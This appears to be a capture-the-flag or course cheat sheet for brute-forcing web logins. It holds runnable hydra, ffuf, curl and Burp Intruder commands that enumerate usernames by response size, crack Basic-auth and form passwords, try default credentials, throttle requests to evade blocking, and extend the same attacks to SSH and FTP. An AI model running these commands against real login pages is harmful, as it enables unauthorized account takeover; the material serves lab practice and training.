# Web Login Brute-force

## Goal
Find the valid username, then its password, using the wordlist the Q names.

**Fast path (script)** — all scripts: [15_scripts](15_scripts.md)
```bash
ctf --try-login "http://$IP/login"                         # cheap tries: bypass strings + ~20 default pairs
ctf --form-brute "http://$IP/login" --wordlist <list>      # form: usernames first, then the password (Ctrl+C, same command continues)
ctf --http-brute "http://$IP/staff/" --wordlist <list>     # browser pop-up login (Basic / Digest)
ctf --form-brute "http://$IP/login" --host-header login.site.local     # form lives on a virtual host
```
Misses / wrong → by hand below.

**Checklist**
- [ ] login type? browser popup = Basic auth (`http-get`) · HTML form = POST (`http-post-form` / ffuf)
- [ ] username list built from the naming convention?
- [ ] username confirmed alone first (its response differs)? → far fewer tries
- [ ] wordlist = the one the Q gives (LMS file), not full rockyou (too slow)

# Commands

### Step 1: which login type
```bash
curl -sI http://$IP/dir/login.php | grep -iE 'HTTP/|WWW-Authenticate'      # 401 + "WWW-Authenticate: Basic" → Step 3a
curl -s http://$IP/login | grep -iE '<form|<input'                         # form → note action, method, field names → Step 3b
curl -s -i -d 'username=a&password=b' http://$IP/login | head -20          # what a FAIL looks like (code, size, text)
```

### Step 2: username list from the convention
```bash
seq -f "user%03g" 0 99 > users.txt        # user000 … user099  (3 digits, first digit known = 0)
seq -f "user%03g" 0 999 > users.txt       # all 3 digits
crunch 7 7 -t user0%% -o users.txt        # same with crunch: % = one digit, 7 = total length
head -3 users.txt; wc -l users.txt
```

### Step 3a: Basic auth (popup)
```bash
# which username exists? send wrong password, group replies by status_size → the group of 1 is the real user
for u in $(cat users.txt); do echo "$(curl -s -o /dev/null -w '%{http_code}_%{size_download}' -u "$u:x" http://$IP/dir/login.php) $u"; done | awk '{n[$1]++; last[$1]=$2} END{for(k in n) print n[k], k, last[k]}' | sort -n
ffuf -w users.txt -u "http://FUZZ:x@$IP/dir/login.php" -mc all -fs <common size>       # same with ffuf
# password for that user
hydra -l <user> -P <wordlist> -f -t 4 $IP http-get /dir/login.php
# username unknown → both lists at once (slower)
hydra -L users.txt -P <wordlist> -f -t 4 $IP http-get /dir/login.php
# log in
curl -s -u '<user>:<pass>' http://$IP/dir/login.php            # or type into the browser popup
```

### Step 3b: HTML form (POST)
```bash
# stage 1: username (junk password). Hide the normal failure by status (-fc) or size (-fs)
ffuf -w users.txt -X POST -d "username=FUZZ&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://$IP/login -mc all -fc 404
# stage 2: password for that user
ffuf -w <wordlist> -X POST -d "username=<user>&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://$IP/login -mc all -fc 401,404
# hydra instead (F= text shown when login FAILS; or S= text shown on success)
hydra -l <user> -P <wordlist> -f $IP http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
# log in
curl -s -d 'username=<user>&password=<pass>' http://$IP/login
```
Site lives on a vhost → add `-H "Host: login.site.local"` to ffuf/curl, or put the name in `/etc/hosts` and use it instead of `$IP`.

### Step 4: Burp Intruder (GUI way) — full walkthrough: [17_burp](17_burp.md)
Proxy on → submit one login → HTTP history → right-click → Send to Intruder → Clear § → select the value → Add § → Payloads: Simple list → Load… → Start attack → sort by Status / Length → the odd row is the hit.
Basic auth in Intruder: Payload processing → Add prefix `<user>:` → Base64-encode; untick "URL-encode".

### Helpline
```bash
# hydra: -l one user | -L user file | -p one pass | -P pass file | -f stop at first hit | -t threads | -s PORT | -S https | -V show tries
# hydra reports EVERY password valid → wrong module or F= text wrong (page is a form, not Basic auth; or the reverse).
# hydra http-post-form "[ERROR] … 401 … set 1=" → harmless; silence it: "/login:username=^USER^&password=^PASS^:1=:F=Invalid"
# ffuf: run once WITHOUT filters, note the common status/size, then filter it: -fc code | -fs size | -fw words.
# success may show ONLY as a different status code or size (e.g. one 200 among 404s) — no text needed.
# field names in -d / hydra string must equal the form's <input name="…">.
# told "may be blocked" / errors → slow down: hydra -t 1 ; ffuf -t 5 -p 0.2
# ssh / ftp brute:  hydra -l <user> -P <wordlist> -s $PORT $IP ssh      (or ftp)
```
